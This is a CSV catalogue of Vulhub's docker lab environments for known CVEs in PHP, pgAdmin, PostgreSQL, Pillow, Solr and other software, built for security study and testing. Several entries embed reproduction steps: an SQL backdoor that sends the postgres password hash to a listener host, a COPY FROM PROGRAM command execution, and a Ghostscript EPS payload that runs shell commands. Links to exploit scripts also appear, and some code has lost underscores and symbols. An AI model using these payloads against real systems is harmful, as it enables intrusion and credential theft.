Name,CVE,Description,References,Path,Type,Startup,Vector
pdfjs,CVE-2024-4367,PDF.js Arbitrary JavaScript Code Execution (CVE-2024-4367),https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/,https://github.com/vulhub/vulhub/tree/master/pdfjs/CVE-2024-4367,docker-compose,docker compose up,remote
pgadmin,CVE-2023-5002,pgAdmin <= 7.6 Authenticated Remote Command Execution (CVE-2023-5002),"https://github.com/pgadmin-org/pgadmin4/commit/35f05e49b3632a0a674b9b36535a7fe2d93dd0c2
https://github.com/advisories/GHSA-ghp8-52vx-77j4",https://github.com/vulhub/vulhub/tree/master/pgadmin/CVE-2023-5002,docker-compose,docker compose up,remote
pgadmin,CVE-2022-4223,pgAdmin <= 6.16 Unauthenticated Remote Command Execution (CVE-2022-4223),"https://github.com/pgadmin-org/pgadmin4/commit/799b6d8f7c10e920c9e67c2c18d381d6320ca604
https://github.com/pgadmin-org/pgadmin4/commit/461849c2763e680ed2296bb8a753ca7aef546595
https://github.com/advisories/GHSA-3v6v-2x6p-32mc",https://github.com/vulhub/vulhub/tree/master/pgadmin/CVE-2022-4223,docker-compose,docker compose up,remote
php,Unknown,PHP XDebug Remote Debugging Code Execution,"https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface
https://xdebug.org
http://[target-ip]:8080/index.php
http://[target-ip]:8081/index.php",unknown,docker-compose,docker compose up,remote
php,Unknown,PHP XML External Entity Injection (XXE),,unknown,docker-compose,docker compose up,remote
php,Unknown,PHP-FPM FastCGI Unauthorized Access Leads to Remote Code Execution,"https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html
https://www.php.net/manual/en/install.fpm.php
https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75",unknown,docker-compose,docker compose up,remote
php,CVE-2019-11043,PHP-FPM Remote Code Execution (CVE-2019-11043),"https://bugs.php.net/bug.php?id=78599
https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/
https://github.com/neex/phuip-fpizdam
https://github.com/neex/phuip-fpizdam:",https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043,docker-compose,docker compose up,remote
php,Unknown,PHP 8.1.0-dev User-Agentt Backdoor Remote Code Execution,"https://news-web.php.net/php.internals/113838
https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d
https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a",unknown,docker-compose,docker compose up,remote
php,Unknown,PHP Local File Inclusion RCE with PHPINFO,https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf,unknown,docker-compose,docker compose up,remote
php,CVE-2012-1823,PHP-CGI Remote Code Execution (CVE-2012-1823),"http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html",https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823,docker-compose,docker compose up,remote
php,CVE-2018-19518,PHP IMAP Remote Command Execution (CVE-2018-19518),"https://bugs.php.net/bug.php?id=77153
https://github.com/Bo0oM/PHP_imap_open_exploit
https://antichat.com/threads/463395/#post-4254681
https://nvd.nist.gov/vuln/detail/CVE-2018-19518",https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518,docker-compose,docker compose up,remote
php,CVE-2024-2961,PHP File Read to Remote Code Execution Through GNU C Library Iconv (CVE-2024-2961),"https://www.ambionics.io/blog/iconv-cve-2024-2961-p1
https://github.com/cfreal/ten/archive/refs/heads/main.zip
https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py
https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py
http://your-ip:8080/index.php",https://github.com/vulhub/vulhub/tree/master/php/CVE-2024-2961,docker-compose,docker compose up,remote
phpmailer,CVE-2017-5223,PHPMailer Arbitrary File Read (CVE-2017-5223),"http://www.freebuf.com/vuls/124820.html
https://www.exploit-db.com/exploits/43056/",https://github.com/vulhub/vulhub/tree/master/phpmailer/CVE-2017-5223,docker-compose,docker compose up,remote
phpmyadmin,Unknown,Phpmyadmin Scripts/setup.php Deserialization Vulnerability (WooYun-2016-199433),,unknown,docker-compose,docker compose up,remote
phpmyadmin,CVE-2016-5734,PhpMyAdmin 4.0.x—4.6.2 Remote Code Execution Vulnerability (CVE-2016-5734),http://your-ip:8080/,https://github.com/vulhub/vulhub/tree/master/phpmyadmin/CVE-2016-5734,docker-compose,docker compose up,remote
phpmyadmin,CVE-2018-12613,phpmyadmin 4.8.1 Remote File Inclusion Vulnerability (CVE-2018-12613),"https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog
https://www.phpmyadmin.net/security/PMASA-2018-4/",https://github.com/vulhub/vulhub/tree/master/phpmyadmin/CVE-2018-12613,docker-compose,docker compose up,remote
phpunit,CVE-2017-9841,PHPUnit Remote Code Execution (CVE-2017-9841),"http://web.archive.org/web/20170701212357/http://phpunit.vulnbusters.com/
https://www.ovh.com/blog/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/",https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841,docker-compose,docker compose up,remote
polkit,CVE-2021-4034,Polkit's pkexec Local Privilege Escalation Vulnerability (CVE-2021-4034),"https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
https://github.com/berdav/CVE-2021-4034
https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gz
https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gz
https://codeload.github.com/berdav/CVE-2021-4034/tar.gz/refs/heads/main
https://codeload.github.com/berdav/CVE-2021-4034/tar.gz/refs/heads/main",https://github.com/vulhub/vulhub/tree/master/polkit/CVE-2021-4034,docker-compose,docker compose up,remote
postgres,CVE-2018-1058,"PostgreSQL Privilege Escalation (CVE-2018-1058)

中文文档

PostgreSQL is a powerful open-source relational database system. A logical error exists in versions 9.3 through 10, where superusers can unknowingly execute malicious code created by regular users, leading to unexpected operations.

References:
https://wiki.postgresql.org/wiki/AGuidetoCVE-2018-1058:ProtectYourSearch_Path
https://xianzhi.aliyun.com/forum/topic/2109

Environment Setup

Execute the following command to start a vulnerable PostgreSQL server:


docker compose up -d


The server will start and listen on the default PostgreSQL port 5432.

Vulnerability Reproduction

Following the second exploitation method from the references, we'll first connect to PostgreSQL as the regular user vulhub:vulhub:

bash
psql --host your-ip --username vulhub




Execute the following SQL statements and then exit:

sql
CREATE FUNCTION public.arraytostring(anyarray,text) RETURNS TEXT AS $$
    select dblinkconnect((select 'hostaddr=10.0.0.1 port=5433 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pgshadow WHERE usename='postgres'))); 
    SELECT pgcatalog.arrayto_string($1,$2);
$$ LANGUAGE SQL VOLATILE;


Now, set up a listener on port 5433 at 10.0.0.1 to wait for the superuser to trigger our ""backdoor"".

(Simulating superuser actions) On the target machine, execute the pg_dump command as the superuser:

bash
docker compose exec postgres pg_dump -U postgres -f evil.bak vulhub


This command will export the contents of the vulhub database. When executed, our ""backdoor"" is triggered, and sensitive information is received on the 10.0.0.1 machine:



This is just one of several exploitation methods for this vulnerability. For more exploitation techniques, please refer to the articles in the References section.
-------------------------------------------------------------------------------","https://wiki.postgresql.org/wiki/A_Guide_to_CVE-2018-1058:_Protect_Your_Search_Path
https://xianzhi.aliyun.com/forum/topic/2109",https://github.com/vulhub/vulhub/tree/master/postgres/CVE-2018-1058,docker-compose,docker compose up,remote
postgres,CVE-2019-9193,"PostgreSQL Arbitrary Command Execution with Admin Privileges (CVE-2019-9193)

中文文档

PostgreSQL is a powerful open-source relational database system. A ""feature"" exists in versions 9.3 through 11 that allows administrators or users with ""COPY TO/FROM PROGRAM"" privileges to execute arbitrary commands on the system.

References:
<https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5

Environment Setup

Execute the following command to start a vulnerable PostgreSQL 10.7 server:


docker compose up -d


The server will start and listen on the default PostgreSQL port 5432, with default credentials postgres/postgres.

Vulnerability Reproduction

First, connect to the PostgreSQL server and execute the following proof of concept:

sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmdexec(cmdoutput text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;


The FROM PROGRAM statement will execute the id command and save the results in the cmd_exec table:
-------------------------------------------------------------------------------",https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5,https://github.com/vulhub/vulhub/tree/master/postgres/CVE-2019-9193,docker-compose,docker compose up,remote
python,Unknown,Python PIL/Pillow Remote Command Execution (GhostButt / CVE-2017-8291),,unknown,docker-compose,docker compose up,remote
python,Unknown,"Python PIL/Pillow Remote Command Execution (CVE-2018-16509)

中文文档

PIL/Pillow is a widely used image processing library in Python.

In Ghostscript versions prior to 9.24, there exists a -dSAFER sandbox bypass vulnerability (CVE-2018-16509). Incorrect ""restoration of privilege"" checking during handling of /invalidaccess exceptions could be used by attackers able to supply crafted PostScript to execute code using the ""pipe"" instruction.

This vulnerability affects various applications that use Ghostscript for image processing, including Python's PIL/Pillow library. When an application uses PIL/Pillow to process user-uploaded images and the environment has a vulnerable version of Ghostscript installed, it may lead to remote command execution.

References:
Ghostscript: -dSAFER bypass (CVE-2018-16509)
PIL/Pillow EPS Image Processing
Ghostscript Sandbox Bypass Analysis

Environment Setup

Execute the following command to start a vulnerable Flask application (using Ghostscript 9.23):


docker compose up -d


After the environment is started, visit http://your-ip:8000 to see a simple image upload page.

Vulnerability Reproduction

Prepare a malicious EPS file (provided as rce.jpg in this environment) with the following content:


%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%touch /tmp/got_rce) currentdevice putdeviceprops


Visit http://your-ip:8000 and upload this file.

After uploading, the server will process this image using PIL/Pillow, and when the resize function is called, it will trigger the vulnerability and execute the touch /tmp/got_rce command.

Execute the following command to verify if the vulnerability has been successfully exploited:


docker compose exec web ls -la /tmp/


If you see the /tmp/got_rce file, it means the command execution was successful.

Vulnerability Analysis

The core of the vulnerability lies in PIL/Pillow calling the system's Ghostscript program when processing EPS images. In EPSImagePlugin.py, PIL uses subprocess to call Ghostscript:

python
command = [""gs"",
           ""-q"",                         # quiet mode
           ""-g%dx%d"" % size,             # set output geometry (pixels)
           ""-r%fx%f"" % res,              # set input DPI (dots per inch)
           ""-dBATCH"",                    # exit after processing
           ""-dNOPAUSE"",                  # don't pause between pages
           ""-dSAFER"",                    # safe mode
           ""-sDEVICE=ppmraw"",            # ppm driver
           ""-sOutputFile=%s"" % outfile,  # output file
           ""-c"", ""%d %d translate"" % (-bbox[0], -bbox[1]),
                                         # adjust for image origin
           ""-f"", infile,                 # input file
           ""-c"", ""showpage"",             # showpage
           ]


Although the -dSAFER parameter is used, Ghostscript versions prior to 9.24 have a sandbox bypass vulnerability that allows attackers to execute arbitrary commands through specially crafted PostScript code.

In the sample application, when an image is uploaded, it is processed as follows:

python
img = Image.open(img_path)
w, h = img.size
ratio = 256.0 / max(w, h)

resized_img = img.resize((int(w  ratio), int(h  ratio)))
resizedimg.save(imgpath)


Simply calling Image.open() will not trigger the vulnerability, but when methods that actually need to load image data, such as resize() or save(), are called, they will trigger the Ghostscript call and execute malicious commands.

To fix this vulnerability, you need to update Ghostscript to version 9.24 or higher, or disable EPS image processing functionality when using PIL/Pillow to process user-uploaded images.
-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
python,Unknown,Python Unpickle Deserialization Remote Code Execution,"http://rickgray.me/2015/09/12/django-command-execution-analysis.html
https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html
https://docs.python.org/3/library/pickle.html#pickle.loads
https://intoli.com/blog/dangerous-pickles/",unknown,docker-compose,docker compose up,remote
rails,CVE-2019-5418,Ruby on Rails Path Traversal and Arbitrary File Read (CVE-2019-5418),"https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q
https://github.com/mpgn/CVE-2019-5418
https://xz.aliyun.com/t/4448",https://github.com/vulhub/vulhub/tree/master/rails/CVE-2019-5418,docker-compose,docker compose up,remote
rails,CVE-2018-3760,Ruby On Rails Path Traversal Vulnerability（CVE-2018-3760）,"https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
https://seclists.org/oss-sec/2018/q2/210
https://xz.aliyun.com/t/2542",https://github.com/vulhub/vulhub/tree/master/rails/CVE-2018-3760,docker-compose,docker compose up,remote
redis,Unknown,Redis Post Exploitation Due to Master and Slave Synchronisation,https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf,unknown,docker-compose,docker compose up,remote
redis,CVE-2022-0543,Redis Lua Sandbox Escape and Remote Code Execution (CVE-2022-0543),"https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce
https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005787",https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543,docker-compose,docker compose up,remote
rocketchat,CVE-2021-22911,Rocket Chat Pre-Auth Blind NoSQL Injection (CVE-2021-22911),"https://blog.sonarsource.com/nosql-injections-in-rocket-chat
https://www.exploit-db.com/exploits/50108
https://github.com/CsEnox/CVE-2021-22911
https://paper.seebug.org/1652/",https://github.com/vulhub/vulhub/tree/master/rocketchat/CVE-2021-22911,docker-compose,docker compose up,remote
rocketmq,CVE-2023-33246,Apache RocketMQ Broker Remote Command Execution (CVE-2023-33246),"https://github.com/I5N0rth/CVE-2023-33246
https://github.com/Le1a/CVE-2023-33246
https://paper.seebug.org/2081/
https://xz.aliyun.com/news/12137
https://xz.aliyun.com/news/12035
https://github.com/vulhub/rocketmq-attack/releases/download/1.0/rocketmq-attack-1.0-SNAPSHOT.jar",https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-33246,docker-compose,docker compose up,remote
rocketmq,CVE-2023-37582,Apache RocketMQ NameServer Arbitrary File Write (CVE-2023-37582),"https://github.com/apache/rocketmq/pull/6843
https://drun1baby.top/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
https://github.com/Malayke/CVE-2023-37582_EXPLOIT
https://github.com/vulhub/rocketmq-attack/releases/download/1.1/rocketmq-attack-1.1-SNAPSHOT.jar",https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-37582,docker-compose,docker compose up,remote
rsync,Unknown,Rsync Unauthorized Access,,unknown,docker-compose,docker compose up,remote
ruby,CVE-2017-17405,Ruby Net::FTP Module Command Injection (CVE-2017-17405),"https://blog.heroku.com/identifying-ruby-ftp-cve
https://www.exploit-db.com/exploits/43381",https://github.com/vulhub/vulhub/tree/master/ruby/CVE-2017-17405,docker-compose,docker compose up,remote
saltstack,CVE-2020-11652,SaltStack Arbitrary File Read and Write (CVE-2020-11652),"https://labs.f-secure.com/advisories/saltstack-authorization-bypass
https://github.com/rossengeorgiev/salt-security-backports
https://github.com/jasperla/CVE-2020-11651-poc",https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-11652,docker-compose,docker compose up,remote
saltstack,CVE-2020-16846,SaltStack Command Injection Remote Code Execution (CVE-2020-16846),"https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag
https://docs.saltstack.com/en/latest/ref/netapi/all/salt.netapi.rest_cherrypy.html",https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-16846,docker-compose,docker compose up,remote
saltstack,CVE-2020-11651,SaltStack Information Disclosure Leads to Privilege Escalation (CVE-2020-11651),"https://labs.f-secure.com/advisories/saltstack-authorization-bypass
https://github.com/rossengeorgiev/salt-security-backports
https://github.com/saltstack/salt/blob/a67d76b15615983d467ed81371b38b4a17e4f3b7/tests/integration/master/test_clear_funcs.py",https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-11651,docker-compose,docker compose up,remote
samba,CVE-2017-7494,"Samba Authenticated RCE (CVE-2017-7494, Aka SambaCry)","https://medium.com/@lucideus/sambacry-rce-exploit-lucideus-research-3a3e5bd9e17c
https://github.com/opsxcq/exploit-CVE-2017-7494
http://bobao.360.cn/learning/detail/3900.html
https://github.com/opsxcq/exploit-CVE-2017-7494",https://github.com/vulhub/vulhub/tree/master/samba/CVE-2017-7494,docker-compose,docker compose up,remote
scrapy,Unknown,Scrapyd Pre-Auth Remote Code Execution,"https://www.leavesongs.com/PENETRATION/attack-scrapy.html
http://your-ip:6800/addversion.json",unknown,docker-compose,docker compose up,remote
shiro,CVE-2016-4437,Apache Shiro 1.2.4 Deserialization Remote Code Execution (CVE-2016-4437),,https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437,docker-compose,docker compose up,remote
shiro,CVE-2020-1957,Apache Shiro Authentication Bypass Vulnerability (CVE-2020-1957),"https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aL139
https://xz.aliyun.com/t/8281
https://blog.spoock.com/2020/05/09/cve-2020-1957/",https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2020-1957,docker-compose,docker compose up,remote
shiro,CVE-2010-3863,Apache Shiro Authentication Bypass Vulnerability (CVE-2010-3863),"https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34
https://xz.aliyun.com/t/11633#toc-2
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863",https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2010-3863,docker-compose,docker compose up,remote
showdoc,Unknown,ShowDoc 3.2.5 SQL Injection,"https://github.com/star7th/showdoc/commit/84fc28d07c5dfc894f5fbc6e8c42efd13c976fda
http://localhost:8080",unknown,docker-compose,docker compose up,remote
showdoc,Unknown,ShowDoc Unauthenticated File Upload and Remote Code Execution (CNVD-2020-26585),"https://github.com/star7th/showdoc/pull/1059
https://github.com/star7th/showdoc/commit/fb77dd4db88dc23f5e570fc95919ee882aca520a
https://github.com/star7th/showdoc/commit/e1cd02a3f98bb227c0599e7fa6b803ab1097597f",unknown,docker-compose,docker compose up,remote
skywalking,Unknown,Apache Skywalking 8.3.0 SQL Injection Vulnerability,"https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw
https://github.com/apache/skywalking/commit/0bd81495965d801315dd7417bb17333ae0eccf3b#diff-ec87a1cdf66cdb37574d9eafd4d72d99ed94a38c4a8ff2aa9c7b8daeff502a2c",unknown,docker-compose,docker compose up,remote
solr,CVE-2019-17558,Apache Solr Remote Code Execution Via Velocity Template (CVE-2019-17558),"https://nvd.nist.gov/vuln/detail/CVE-2019-17558
https://issues.apache.org/jira/browse/SOLR-13971
https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133
https://github.com/jas502n/solr_rce",https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-17558,docker-compose,docker compose up,remote
solr,CVE-2017-12629,Apache Solr XML External Entity Injection (CVE-2017-12629),"https://www.exploit-db.com/exploits/43009/
https://paper.seebug.org/425/",https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629,docker-compose,docker compose up,remote
solr,CVE-2019-0193,Apache Solr Remote Command Execution (CVE-2019-0193),"https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA
https://paper.seebug.org/1009/
http://your-ip:8983
http://your-ip:8983/solr/",https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193,docker-compose,docker compose up,remote
solr,Unknown,Apache Solr RemoteStreaming Arbitrary File Reading and SSRF,https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ,unknown,docker-compose,docker compose up,remote
solr,CVE-2017-12629,Apache Solr Remote Command Execution (CVE-2017-12629),"https://www.exploit-db.com/exploits/43009/
https://paper.seebug.org/425/",https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629,docker-compose,docker compose up,remote
spark,Unknown,Apache Spark Unauthorized Access Leads to Remote Code Execution,"https://weibo.com/ttarticle/p/show?id=2309404187794313453016
https://xz.aliyun.com/t/2490",unknown,docker-compose,docker compose up,remote